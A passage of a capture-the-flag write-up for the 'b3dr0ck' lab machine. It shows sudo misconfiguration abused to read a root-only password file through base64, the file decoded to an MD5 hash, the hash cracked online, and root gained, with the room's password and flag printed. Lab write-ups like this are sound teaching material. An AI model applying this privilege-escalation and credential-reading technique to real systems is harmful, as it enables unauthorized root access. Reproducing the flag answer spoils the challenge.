fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@b3dr0ck:~$ sudo base64 -d /root/pass.txt
[sudo] password for fred: 
Sorry, user fred is not allowed to execute '/usr/bin/base64 -d /root/pass.txt' as root on b3dr0ck.
fred@b3dr0ck:~$ base64 -d /root/pass.txt
base64: /root/pass.txt: Permission denied
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```

### Decoding and Hash Cracking 
```zsh
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ echo -n "TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==" | base64 -d | base32 -d | base64 -d 
a00a12aad6b7c16bf07032bd05a31d56
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ hashid a00a12aad6b7c16bf07032bd05a31d56                                      ░▒▓ ✔ 
Analyzing 'a00a12aad6b7c16bf07032bd05a31d56'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```
Notes: hashcat was not able to crack it with rockyou.txt so I used https://crackstation.net/
Resutls: a00a12aad6b7c16bf07032bd05a31d56	md5	flintstonesvitamins

### Rooting the machine
```zsh
fred@b3dr0ck:~$ su root
Password: 
root@b3dr0ck:/home/fred# find / -name root.txt -type f 2>/dev/null
/root/root.txt
root@b3dr0ck:/home/fred# cat /root/root.txt
THM{de4043c009214b56279982bf10a661b7}
root@b3dr0ck:/home/fred# 
```
# Done
